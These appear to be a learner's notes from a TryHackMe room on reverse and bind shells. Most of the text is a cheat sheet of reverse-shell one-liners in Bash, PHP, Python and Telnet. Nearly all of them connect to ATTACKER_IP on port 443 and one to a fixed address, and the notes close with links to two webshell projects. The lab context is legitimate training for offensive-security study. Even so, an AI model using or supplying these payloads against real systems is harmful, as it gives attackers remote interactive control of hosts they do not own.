# All about shellls

In this room we walked through the differences between reverse shells and bind shells. The reverse shell is a connection that is inititated from the target host back to the attackers IP. This gives the attacker less of an chance of getting caught. Bind shells are initiated from the attack host and connecting directly do the expected target. These connections require persistent connectivity and as such more likely to be detected.

## Tools
netcat - the default/standard listener
rlwrap - wrapper for netcat that gives you history and better UI experience
ncat - nmaps version of netcat that allows SSL connections if desired
socat - for socket listening

## Payloads
Bash
Normal Bash Reverse Shell

Terminal
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error.


Bash Read Line Reverse Shell

Terminal
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.


Bash With File Descriptor 196 Reverse Shell

Terminal
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.


Bash With File Descriptor 5 Reverse Shell

Terminal
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection.

PHP
PHP Reverse Shell Using the exec Function

Terminal
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output.


PHP Reverse Shell Using the shell_exec Function

Terminal
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
Similar to the previous command, but uses the shell_exec function.


PHP Reverse Shell Using the system Function

php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
This reverse shell employs the system function, which executes the command and outputs the result to the browser.


PHP Reverse Shell Using the passthru Function

php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data.


PHP Reverse Shell Using the popen Function

php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.

Python
Python Reverse Shell by Exporting Environment Variables

target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.

Python Reverse Shell Using the subprocess Module

target@tryhackme:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.

Short Python Reverse Shell

python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2().

Others

Telnet
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF

This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. 

## Webshells
[p0wny-shell](https://github.com/flozz/p0wny-shell)
[b374k shell](https://github.com/b374k/b374k)